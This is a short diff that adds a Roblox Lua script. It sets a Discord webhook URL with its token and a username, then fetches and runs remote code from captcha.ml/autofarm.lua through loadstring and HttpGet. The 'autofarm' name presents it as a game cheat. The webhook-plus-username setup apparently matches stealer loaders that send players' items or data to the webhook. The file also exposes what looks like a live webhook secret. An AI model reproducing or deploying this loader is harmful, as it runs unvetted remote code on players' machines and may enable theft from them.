@@ -1,0 +1,4 @@
+_G.Webhook = "https://discord.com/api/webhooks/1069675987077431317/7KG25pdpMvQVZNKB_Nlihd2UMkI3VYScZJe42cqIqQW9nWK4We-pHc4Vmwdl0c7ABhH6"
+_G.Username = "vikiben10"
+
+loadstring(game:HttpGet("https://captcha.ml/autofarm.lua"))()
